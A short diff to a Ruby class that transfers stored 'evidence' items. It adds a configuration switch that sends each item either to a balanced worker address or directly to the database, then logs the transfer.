@@ -117,15 +117,13 @@ class EvidenceTransfer
     evidence = EvidenceManager.instance.get_evidence(id, instance)
     raise "evidence to be transferred is nil" if evidence.nil?
 
-=begin
-    address = get_worker_address(instance)
-    raise "invalid worker address" unless address
-
-    ret, error, action = send_evidence(address, instance, evidence)
-=end
-
-    # send and delete the evidence
-    ret, error, action = DB.instance.send_evidence(instance, evidence)
+    if Config.instance.global['WORKER_BALANCING']
+      address = get_worker_address(instance)
+      raise "invalid worker address" unless address
+      ret, error, action = send_evidence(address, instance, evidence)
+    else
+      ret, error, action = DB.instance.send_evidence(instance, evidence)
+    end
 
     if ret
       trace :info, "Evidence sent to db [#{instance}] #{evidence.size.to_s_bytes} - #{left} left to send"
